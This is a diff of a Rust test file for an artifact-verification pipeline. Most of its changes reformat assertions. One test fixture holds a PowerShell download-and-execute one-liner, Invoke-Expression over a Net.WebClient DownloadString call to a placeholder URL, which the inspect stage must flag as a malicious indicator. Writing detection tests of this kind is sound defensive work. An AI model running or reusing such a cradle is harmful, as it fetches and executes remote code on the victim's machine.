@@ -50,8 +50,14 @@ async fn test_hash_stage_produces_consistent_sha256() {
         .await
         .expect("hash stage 2");
 
-    assert_eq!(result.sha256, result2.sha256, "SHA-256 must be deterministic");
-    assert_eq!(result.sha512, result2.sha512, "SHA-512 must be deterministic");
+    assert_eq!(
+        result.sha256, result2.sha256,
+        "SHA-256 must be deterministic"
+    );
+    assert_eq!(
+        result.sha512, result2.sha512,
+        "SHA-512 must be deterministic"
+    );
     assert!(!result.sha256.is_empty());
     assert_eq!(result.sha256.len(), 64, "SHA-256 hex must be 64 chars");
     assert_eq!(result.sha512.len(), 128, "SHA-512 hex must be 128 chars");
@@ -109,7 +115,10 @@ async fn test_artifact_mutation_detection() {
 
     // Verify hash matches.
     let current_hash = sha256_file(artifact.path()).expect("sha256 again");
-    assert_eq!(original_hash, current_hash, "Hash should not change without mutation");
+    assert_eq!(
+        original_hash, current_hash,
+        "Hash should not change without mutation"
+    );
 
     // Simulate mutation.
     artifact.write_all(b" mutated").expect("write mutation");
@@ -181,7 +190,8 @@ async fn test_inspect_stage_detects_url_indicator() {
 
 #[tokio::test]
 async fn test_inspect_stage_detects_powershell_indicator() {
-    let content = b"call Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x.y/z')";
+    let content =
+        b"call Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x.y/z')";
     let artifact = temp_artifact(content);
     let policy = default_policy();
 
@@ -195,7 +205,10 @@ async fn test_inspect_stage_detects_powershell_indicator() {
         .iter()
         .filter(|i| i.contains("PowerShell"))
         .collect();
-    assert!(!ps_indicators.is_empty(), "Should find PowerShell indicator");
+    assert!(
+        !ps_indicators.is_empty(),
+        "Should find PowerShell indicator"
+    );
 }
 
 #[tokio::test]
@@ -213,7 +226,11 @@ async fn test_entropy_computation_uniform_data() {
         high_entropy.extend_from_slice(&[i; 4]);
     }
     let e2 = shannon_entropy(&high_entropy);
-    assert!(e2 > 7.0, "Uniform byte distribution entropy should be ~8, got {}", e2);
+    assert!(
+        e2 > 7.0,
+        "Uniform byte distribution entropy should be ~8, got {}",
+        e2
+    );
 }
 
 #[tokio::test]
@@ -233,7 +250,10 @@ async fn test_entropy_threshold_flagging() {
         .await
         .expect("inspect stage");
 
-    assert!(result.result.entropy_flagged, "High entropy data should be flagged");
+    assert!(
+        result.result.entropy_flagged,
+        "High entropy data should be flagged"
+    );
 }
 
 #[tokio::test]
@@ -247,8 +267,18 @@ async fn test_evidence_deterministic_id_stability() {
     outputs.insert("result".to_string(), serde_json::json!("ok"));
 
     // Build same evidence twice — deterministic ID must differ only by timestamp.
-    let e1 = EvidenceItem::new("test_stage", inputs.clone(), outputs.clone(), HashMap::new());
-    let e2 = EvidenceItem::new("test_stage", inputs.clone(), outputs.clone(), HashMap::new());
+    let e1 = EvidenceItem::new(
+        "test_stage",
+        inputs.clone(),
+        outputs.clone(),
+        HashMap::new(),
+    );
+    let e2 = EvidenceItem::new(
+        "test_stage",
+        inputs.clone(),
+        outputs.clone(),
+        HashMap::new(),
+    );
 
     // Both must have non-empty 64-char hex IDs.
     assert_eq!(e1.deterministic_id.len(), 64);
@@ -286,7 +316,6 @@ async fn test_policy_require_signature_fails_without_sig() {
 
     let mut policy = default_policy();
     policy.require_signature = true;
-    policy.allow_unsigned = false;
 
     let mut pipeline = PipelineResults::default();
     pipeline.signature_status = SignatureResult::Missing;
@@ -366,11 +395,8 @@ async fn test_adjacent_appended_lowercase_checksum_discovered() {
         .await
         .expect("hash stage baseline");
 
-    std::fs::write(
-        dir.path().join("artifact.tar.gz.sha256"),
-        &baseline.sha256,
-    )
-    .expect("write adjacent checksum");
+    std::fs::write(dir.path().join("artifact.tar.gz.sha256"), &baseline.sha256)
+        .expect("write adjacent checksum");
 
     let result = hash::run(&artifact_path, &policy, None, None)
         .await
@@ -390,11 +416,8 @@ async fn test_adjacent_appended_checksum_mismatch_is_detected() {
     let dir = tempfile::TempDir::new().expect("tempdir");
     let artifact_path = dir.path().join("artifact.tar.gz");
     std::fs::write(&artifact_path, b"appended checksum tamper test").expect("write artifact");
-    std::fs::write(
-        dir.path().join("artifact.tar.gz.sha256"),
-        "0".repeat(64),
-    )
-    .expect("write bogus checksum");
+    std::fs::write(dir.path().join("artifact.tar.gz.sha256"), "0".repeat(64))
+        .expect("write bogus checksum");
 
     let policy = default_policy();
     let result = hash::run(&artifact_path, &policy, None, None).await;
